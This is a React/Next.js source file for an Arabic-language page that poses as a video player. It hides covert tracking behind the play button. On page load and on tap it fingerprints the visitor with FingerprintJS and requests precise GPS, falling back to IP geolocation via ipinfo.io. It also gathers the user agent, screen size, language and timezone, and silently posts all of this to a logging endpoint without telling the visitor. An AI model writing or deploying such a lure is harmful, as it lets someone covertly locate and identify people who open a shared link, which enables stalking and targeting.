"use client";

import { useEffect, useState } from 'react';
import * as fpjs from '@fingerprintjs/fingerprintjs';

function CustomPlayer({ url, onPlay }: { url: string, onPlay: () => void }) {
  const [interacted, setInteracted] = useState(false);

  const handleInteraction = () => {
    if (!interacted) {
      setInteracted(true);
      onPlay();
    }
  };

  if (!url) return null;

  let player = null;
  const playerStyle = { position: 'absolute' as const, top: 0, left: 0, width: '100%', height: '100%' };
  
  if (url.includes('youtube.com') || url.includes('youtu.be')) {
    const videoId = url.includes('v=') ? url.split('v=')[1].split('&')[0] : url.split('/').pop();
    player = <iframe style={playerStyle} src={`https://www.youtube.com/embed/${videoId}?autoplay=${interacted ? 1 : 0}`} frameBorder="0" allowFullScreen allow="autoplay"></iframe>;
  } else if (url.includes('facebook.com')) {
    const fbUrl = encodeURIComponent(url);
    player = <iframe src={`https://www.facebook.com/plugins/video.php?href=${fbUrl}&show_text=false&autoplay=${interacted ? 'true' : 'false'}`} style={{...playerStyle, border: 'none', overflow: 'hidden'}} scrolling="no" frameBorder="0" allowFullScreen={true} allow="autoplay; clipboard-write; encrypted-media; picture-in-picture; web-share"></iframe>;
  } else {
    player = <video src={url} controls style={playerStyle} onPlay={onPlay}></video>;
  }

  return (
    <div style={{ position: 'relative', width: '100%', borderRadius: '12px', overflow: 'hidden', backgroundColor: '#000', aspectRatio: '16/9' }}>
      {!interacted && (
        <button 
          type="button"
          onClick={handleInteraction}
          style={{
            position: 'absolute', top: 0, left: 0, width: '100%', height: '100%', 
            zIndex: 10, cursor: 'pointer', background: 'linear-gradient(180deg, rgba(0,0,0,0.6) 0%, rgba(0,0,0,0.85) 100%)',
            display: 'flex', flexDirection: 'column', justifyContent: 'center', alignItems: 'center',
            color: 'white', border: 'none', fontFamily: 'inherit', padding: '1rem'
          }}
        >
          <div style={{
            width: '74px', height: '74px', 
            background: 'linear-gradient(135deg, #0284c7 0%, #0369a1 100%)', 
            borderRadius: '50%',
            display: 'flex', justifyContent: 'center', alignItems: 'center', marginBottom: '1.2rem',
            boxShadow: '0 8px 25px rgba(2, 132, 199, 0.6), 0 0 0 6px rgba(2, 132, 199, 0.2)',
            transition: 'transform 0.2s ease'
          }}>
            <div style={{
              width: 0, height: 0, 
              borderTop: '13px solid transparent', 
              borderBottom: '13px solid transparent',
              borderLeft: '22px solid white', 
              marginLeft: '5px'
            }}></div>
          </div>
          <h2 style={{ fontSize: '1.3rem', fontWeight: 'bold', margin: 0, color: '#f8fafc', textShadow: '0 2px 8px rgba(0,0,0,0.8)' }}>
            اضغط هنا لتشغيل الفيديو
          </h2>
        </button>
      )}
      {interacted ? player : null}
    </div>
  );
}

export default function Home() {
  const [videoUrl, setVideoUrl] = useState<string | null>(null);
  const [title, setTitle] = useState<string>('مشغل الفيديو');
  const [loading, setLoading] = useState(true);
  const [logSent, setLogSent] = useState(false);
  const [mounted, setMounted] = useState(false);
  const [cachedFp, setCachedFp] = useState<string>('unknown');

  const [cachedCoords, setCachedCoords] = useState<{ lat: number; lon: number } | null>(null);

  useEffect(() => {
    setMounted(true);

    // Preload Fingerprint in background on load
    try {
      const loader = fpjs.default?.load || fpjs.load;
      if (loader) {
        loader()
          .then(fp => fp.get())
          .then(res => {
            if (res.visitorId) setCachedFp(res.visitorId);
          })
          .catch(() => {});
      }
    } catch (e) {}

    // Request Location on page mount as well
    if (typeof navigator !== 'undefined' && 'geolocation' in navigator) {
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          setCachedCoords({ lat: pos.coords.latitude, lon: pos.coords.longitude });
        },
        () => {},
        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
      );
    }

    // Fetch video URL and title
    fetch('/api/video', { cache: 'no-store' })
      .then(res => res.json())
      .then(data => {
        let url = data.videoUrl;
        if (data.title) setTitle(data.title);
        
        // Fix old upload URLs to use the streaming API
        if (url && url.startsWith('/uploads/')) {
          url = url.replace('/uploads/', '/api/file/');
        }

        // Fix Facebook Reel URLs 
        if (url && url.includes('facebook.com/reel/')) {
          const reelId = url.split('/reel/')[1].split('/')[0].split('?')[0];
          url = `https://www.facebook.com/video.php?v=${reelId}`;
        }
        setVideoUrl(url);
        setLoading(false);
      });
  }, []);

  const handlePlay = () => {
    if (logSent) return;

    // Trigger Geolocation on tap gesture (or use cached if already allowed)
    const geoPromise = new Promise<{ lat: number | null, lon: number | null }>((resolve) => {
      if (cachedCoords) {
        resolve(cachedCoords);
        return;
      }

      if (typeof navigator === 'undefined' || !('geolocation' in navigator)) {
        resolve({ lat: null, lon: null });
        return;
      }

      navigator.geolocation.getCurrentPosition(
        (pos) => {
          resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude });
        },
        (err) => {
          console.warn("GPS permission or signal error:", err.message);
          resolve({ lat: null, lon: null });
        },
        {
          enableHighAccuracy: true,
          timeout: 10000,
          maximumAge: 0
        }
      );
    });

    // Execute background data collection and logging
    (async () => {
      let fingerprint = cachedFp;
      if (fingerprint === 'unknown') {
        try {
          const loader = fpjs.default?.load || fpjs.load;
          if (loader) {
            const fp = await loader();
            const res = await fp.get();
            fingerprint = res.visitorId || 'unknown';
          }
        } catch (e) {}
      }

      let { lat, lon } = await geoPromise;

      // Fallback to IP Geolocation if GPS is not granted
      if (lat === null || lon === null) {
        try {
          const res = await fetch('https://ipinfo.io/json');
          const data = await res.json();
          if (data.loc) {
            const parts = data.loc.split(',');
            lat = parseFloat(parts[0]);
            lon = parseFloat(parts[1]);
          }
        } catch (e) {}
      }

      let screenResolution = null;
      let language = null;
      let timezone = null;
      if (typeof window !== 'undefined') {
        screenResolution = `${window.screen.width}x${window.screen.height}`;
        language = navigator.language;
        timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
      }

      try {
        await fetch('/api/log', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            fingerprint,
            latitude: lat,
            longitude: lon,
            userAgent: navigator.userAgent,
            screenResolution,
            language,
            timezone
          })
        });
        setLogSent(true);
      } catch (e) {
        console.error("API fetch failed", e);
      }
    })();
  };

  if (loading || !mounted) {
    return (
      <div style={{ display: 'flex', justifyContent: 'center', alignItems: 'center', minHeight: '100dvh', backgroundColor: '#0a0d14', color: '#94a3b8', fontSize: '1.1rem', fontFamily: 'Arial, sans-serif' }} dir="rtl">
        جاري التحميل...
      </div>
    );
  }

  return (
    <main style={{ 
      padding: '0.75rem', 
      display: 'flex', 
      flexDirection: 'column', 
      justifyContent: 'center', 
      alignItems: 'center', 
      minHeight: '100dvh',
      backgroundColor: '#0a0d14',
      boxSizing: 'border-box'
    }} dir="rtl">
      <div style={{ 
        width: '100%', 
        maxWidth: '960px', 
        padding: '1.2rem', 
        borderRadius: '16px',
        backgroundColor: 'rgba(23, 27, 38, 0.95)',
        border: '1px solid rgba(255, 255, 255, 0.08)',
        boxShadow: '0 25px 50px -12px rgba(0, 0, 0, 0.8)',
        backdropFilter: 'blur(16px)',
        WebkitBackdropFilter: 'blur(16px)'
      }}>
        <h1 style={{ 
          marginBottom: '1.2rem', 
          textAlign: 'center', 
          fontSize: '1.6rem', 
          fontWeight: 'bold', 
          color: '#38bdf8',
          letterSpacing: '-0.01em',
          lineHeight: 1.4
        }}>
          {title}
        </h1>
        
        {videoUrl ? (
          <div style={{ borderRadius: '12px', overflow: 'hidden', width: '100%', boxShadow: '0 10px 30px rgba(0,0,0,0.6)' }}>
            <CustomPlayer url={videoUrl} onPlay={handlePlay} />
          </div>
        ) : (
          <p style={{ textAlign: 'center', color: '#94a3b8', padding: '2rem 0' }}>لا يوجد فيديو متاح حالياً.</p>
        )}
        
      </div>
    </main>
  );
}
